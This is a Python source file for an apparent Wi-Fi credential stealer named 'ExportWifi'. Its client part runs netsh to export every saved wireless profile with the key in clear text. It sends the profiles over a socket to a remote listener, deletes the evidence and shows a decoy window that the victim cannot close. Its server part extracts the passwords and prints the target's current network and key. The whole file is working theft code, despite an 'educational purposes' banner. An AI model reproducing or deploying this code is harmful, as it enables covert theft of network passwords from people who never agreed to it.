import ast
import os
import shutil
import time
import socket
import subprocess
import pyautogui
import tkinter as tk
import threading
from reportlab.pdfgen import canvas
from reportlab.lib import colors

wlanname = ""
pathsave = ""
password = ""


def countdown():  # This is the function where the targets gui gets closed automatically
    global my_timer
    my_timer = 20
    # This is the seconds when it gets
    time.sleep(my_timer)

    root.quit()
    # This closes the gui


def validateLogin():  # Just prints
    global wlanname
    global password
    global pathsave
    print("WLAN entered :", wlanname.get())
    print("password entered :", password.get())
    print("path: ", pathsave.get())
    return


def make_pdf():  # Makes a pdf
    global wlanname
    global password
    global pathsave
    wlanname = wlanname.get()
    password = password.get()
    pathsave = pathsave.get()
    # Gets all the information of the gui

    print(wlanname, password, pathsave)
    fileName = f'{pathsave}/exported_{wlanname}.pdf'
    documentTitle = 'Wifi Export'
    title = 'WIFI'
    subTitle = ''
    textLines = [
        f'Wifi Name:{wlanname}',
        f'Password: {password}',
    ]

    # creating a pdf object
    pdf = canvas.Canvas(fileName)

    # setting the title of the document
    pdf.setTitle(documentTitle)

    # registering a external font in python
    # pdfmetrics.registerFont(
    #    TTFont('abc', 'SakBunderan.ttf')
    # )

    # creating the title by setting it's font
    # and putting it on the canvas
    # pdf.setFont('abc', 36)
    pdf.drawCentredString(300, 770, title)

    # creating the subtitle by setting it's font,
    # colour and putting it on the canvas
    pdf.setFillColorRGB(0, 0, 255)
    pdf.setFont("Courier-Bold", 24)
    pdf.drawCentredString(290, 720, subTitle)

    # drawing a line
    pdf.line(30, 710, 550, 710)

    # creating a multiline text using
    # textline and for loop
    text = pdf.beginText(40, 680)
    text.setFont("Courier", 18)
    text.setFillColor(colors.red)
    for line in textLines:
        text.textLine(line)
    pdf.drawText(text)

    # drawing a image at the
    # specified (x.y) position
    # pdf.drawInlineImage(image, 130, 400)

    # saving the pdf
    pdf.save()


class WlanClient:
    def __init__(self, ip, port):
        # Put in the servers ip-address and a four digits number for the port
        self.ip = ip
        self.port = port

    def start(self):
        global root, richtiges_wlan
        # root is the tkinter initializer

        command = subprocess.check_output(["Netsh", "Wlan", "show", "interfaces"])
        # Detect the current network of the target

        str_command = str(command)
        with open("wlan.txt", "a+") as file:
            # Create a file where all the data is being stored in
            file.write(str_command)

        with open("wlan.txt", "r+") as wlan_file:
            # Open the file again
            wlan_name_liste = []
            for line in wlan_file:
                spalten = line.split(":")
                for wort in spalten:
                    if "BSSID" in wort:
                        # Find the current Wifi of the target
                        name = wort.split("\r")
                        wlan_name_liste.append(name)

        for wlan in wlan_name_liste[0]:
            wlan = wlan.split("\\r")
            # Gets the wifi of the target
            richtiges_wlan = wlan[0]
            # "richtiges_wlan" means right_wifi

        if os.path.exists("wlan.txt"): os.remove("wlan.txt")
        # This is the file where the wifi is stored

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.ip, self.port))

        command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"],
                                 capture_output=True).stdout.decode()
        # This command gets all wifi_files

        path = os.getcwd()

        inhalt = {}
        lst_wlan = []
        for wlan in os.listdir(path):
            if wlan.startswith("WLAN") or wlan.startswith("Wireless") and wlan.endswith(".xml"):
                lst_wlan.append(wlan)
                with open(wlan, "r+") as file:
                    full_msg = "".join(file)

                inhalt[wlan] = full_msg
                # Stores everything in inhalt

        inhalt["CURRENTWIFI"] = richtiges_wlan
        alle_wlan_namen = str(inhalt)
        s.send(alle_wlan_namen.encode())
        # This is just a directory
        s.close()

        for wlan_name in lst_wlan:
            if os.path.exists(wlan_name): os.remove(wlan_name)

        countdown_thread = threading.Thread(target=countdown)
        countdown_thread.start()

        res = pyautogui.size()
        parse = str(res).split("=")
        zahl1 = parse[1].split(",")
        zahl2 = parse[2].split(")")

        x_wert, y_wert = zahl1[0], zahl2[0]
        size = f"{x_wert}x{y_wert}"
        global validate_login
        global wlanname
        global pathsave
        global password
        root = tk.Tk()
        root.geometry(size)
        root.title(f"No Problem the Programm will be closed in {my_timer}s")
        wlannameLabel = tk.Label(root, text="WI-FI Name").grid(row=0, column=0)
        wlanname = tk.StringVar()
        wlannameEntry = tk.Entry(root, textvariable=wlanname).grid(row=0, column=1)
        # password label and password entry box
        passwordLabel = tk.Label(root, text="Password").grid(row=1, column=0)
        password = tk.StringVar()
        passwordEntry = tk.Entry(root, textvariable=password, show='*').grid(row=1, column=1)
        pathLabel = tk.Label(root, text="Path to save pdf").grid(row=0, column=2)
        pathsave = tk.StringVar()
        # validate_login = partial(validateLogin, wlanname, password, path)
        passwordEntry = tk.Entry(root, textvariable=pathsave, show='*').grid(row=1, column=2)

        loginButton = tk.Button(root, text="Print", command=make_pdf).grid(row=4, column=0)

        root.protocol("WM_DELETE_WINDOW", 0)
        root.mainloop()


class WlanServer:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.idx = None

    def get_key_material(self, file):
        for line in file:
            if "keyMaterial" in line:
                teilen = line.split(">")
                lst_passwort = teilen[1].split("<")
                current_password = lst_passwort[0]
                return current_password

        return None


    def start(self):
        gui = """
___________                             __   __      __.__  _____.__ 
\_   _____/__  _________   ____________/  |_/  \    /  \__|/ ____\__|
 |    __)_\  \/  /\____ \ /  _ \_  __ \   __\   \/\/   /  \   __\|  |
 |        \>    < |  |_> >  <_> )  | \/|  |  \        /|  ||  |  |  |
/_______  /__/\_ \|   __/ \____/|__|   |__|   \__/\  / |__||__|  |__|
        \/      \/|__|                             \/                

        ~Created by: Kill0ger~
        REMINDER THIS WAS BUILD FOR EDUCATIONAL PURPOSES  
        SO DON'T USE THIS FOR EVIL ACTIVITIES !!!!!        
        """
        print(gui)
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            server.bind((self.ip, self.port))
            server.listen(5)

        except socket.gaierror:
            print("INSERT A VALID IP-ADDRESS")
            quit()

        print("Waiting for connection....")
        client_socket, adresse = server.accept()
        print(f"Connection with {adresse}")

        buffer = 20
        # Gets the data
        str_dict = ""
        while True:
            msg = client_socket.recv(buffer).decode()
            if len(msg) <= 0: break
            str_dict += msg
            # Everything will be stored in name

        inhalt = ast.literal_eval(str_dict)
        # This function makes a string to a directory
        wlan_liste = []

        for wlan_name, value in inhalt.items():
            if os.path.exists(wlan_name): os.remove(wlan_name)

            if wlan_name != "CURRENTWIFI":
                # All the wifi files will be stored in wlan_liste
                wlan_liste.append(wlan_name)
                with open(wlan_name, "a+") as file:
                    file.write(value)

        current_name_space = inhalt["CURRENTWIFI"]
        # Gets the cureentwifi of the target
        current_name = current_name_space.replace(" ", "")
        check = 0
        found = "FOUND_PASSWORDS"
        xmlfiles = "XML_FILES"

        if found not in os.listdir():
            # This only here to create a directory
            os.system(f"mkdir {found}")

        for wlan in wlan_liste:
            if current_name in wlan:
                with open(wlan, "r+") as file:
                    current_password = self.get_key_material(file)
                    # This function gets the password of the wifi_file
                    check += 1

            new_name = wlan[::-1]
            # This will store the wifi file backwards so its easier to find the wifiname
            this_name = new_name[4:][::-1]
            # This gets the wifi file without the file extension ".xml" and stores them back backwards
            for each in wlan:
                if "-" in each:
                    self.idx = wlan.index("-")
                    # This gets the index of "-" because the file in every country is different
                    break

            filename_wlan = this_name[self.idx + 1:]
            # This gets the excact filename

            with open(wlan, "r+") as this_file:
                this_password = self.get_key_material(this_file)
                # Gets the password of the wifi_file

            os.chdir(f"{found}")
            # Changes the directory so every wifi file with txt extension will be stored in "XML_FILES"
            with open(f"{filename_wlan}.txt", "a+") as wlan_file:
                if this_password is None: this_password = "encrypted password"
                # Checks if the file has a password
                wlan_file.write(f"WLAN: {filename_wlan}\n\nPassword of {filename_wlan}: {this_password}")
            os.chdir("..")

        if xmlfiles not in os.listdir():
            # Makes a directory if it isn't already made
            os.system(f"mkdir {xmlfiles}")

        for each_xml_file in wlan_liste:
            # Moves all wifi files with xml extension to "XML_FILES"
            try:
                shutil.move(each_xml_file, f"{xmlfiles}")

            except shutil.Error:
                # Checks if the file already exists
                print("This XML File already exists")

        print("\nConnection has been established")
        print(f'{len(wlan_liste)} Wifi files have been saved to "FOUND_PASSWORDS" and "XML_FILES"')
        if check >= 1:
            print(
                f"The current WI-FI and Password of the target is \n\nWI-FI: {current_name}\nPassword: {current_password}")
        else:
            print(f"The current WI-FI of the target is \n\nWI-FI: {current_name}\nThe password couldn't be detected")
        print("THANK YOUR FOR USING EXPORTWIFI")
